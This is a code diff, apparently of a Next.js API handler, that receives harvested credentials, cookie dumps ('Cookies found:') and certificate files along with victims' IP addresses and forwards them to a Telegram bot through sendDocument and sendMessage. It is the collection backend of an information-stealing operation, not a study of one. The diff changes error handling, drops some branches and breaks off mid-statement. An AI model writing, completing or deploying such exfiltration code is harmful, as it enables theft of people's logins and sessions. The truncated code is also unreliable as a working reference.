@@ -38,7 +38,7 @@ handler.post(async (req, res) => {
 
     // Handle JSON payloads (creds, etc.)
     if (contentType.includes('application/json')) {
-      // Parse JSON body
+      // Parse JSON body manually since bodyParser is false
       let body = '';
       await new Promise((resolve, reject) => {
         req.on('data', chunk => body += chunk);
@@ -48,7 +48,8 @@ handler.post(async (req, res) => {
       let json;
       try {
         json = JSON.parse(body);
-      } catch {
+      } catch (err) {
+        console.error('JSON parse error:', err);
         return res.status(400).json({ success: false, message: 'Invalid JSON' });
       }
 
@@ -61,7 +62,6 @@ handler.post(async (req, res) => {
       if (text && text.startsWith('Cookies found:')) {
         const form = new FormData();
         form.append('chat_id', chatId);
-        // Use IP or Date.now for unique filename
         const fname = `${ip || 'cookie'}-COOKIE.txt`;
         form.append('document', Buffer.from(text, 'utf-8'), {
           filename: fname,
@@ -71,61 +71,10 @@ handler.post(async (req, res) => {
         let caption = ip ? `IP: ${ip}\n` : '';
         if (type) caption += `Type: ${type}\n`;
         if (caption) form.append('caption', caption);
+
         const tgRes = await fetch(`${botUrl}/sendDocument`, {
           method: 'POST',
           body: form,
           headers: form.getHeaders()
         });
-        if (!tgRes.ok) throw await tgRes.text();
-        return res.status(200).json({ success: true });
-      } else {
-        // Otherwise, send as plain text message
-        const tgRes = await fetch(`${botUrl}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text
-          })
-        });
-        if (!tgRes.ok) throw await tgRes.text();
-        return res.status(200).json({ success: true });
-      }
-    }
-
-    // Handle file uploads (cookies/certs)
-    if (req.file) {
-      const form = new FormData();
-      form.append('chat_id', chatId);
-      form.append(
-        'document',
-        req.file.buffer,
-        {
-          filename: req.file.originalname,
-          contentType: req.file.mimetype || 'text/plain'
-        }
-      );
-      const { ip, type } = req.body;
-      let caption = '';
-      if (ip) caption += `IP: ${ip}\n`;
-      if (type) caption += `Type: ${type}\n`;
-      if (caption.length) form.append('caption', caption);
-
-      const tgRes = await fetch(`${botUrl}/sendDocument`, {
-        method: 'POST',
-        body: form,
-        headers: form.getHeaders()
-      });
-      if (!tgRes.ok) throw await tgRes.text();
-      return res.status(200).json({ success: true });
-    }
-
-    // Bad/unknown payload
-    res.status(400).json({ success: false, message: 'Bad payload' });
-  } catch (err) {
-    console.error('Telegram API error:', err);
-    res.status(502).json({ success: false, error: String(err) });
-  }
-});
-
-export default handler;
+        const tgText = aw
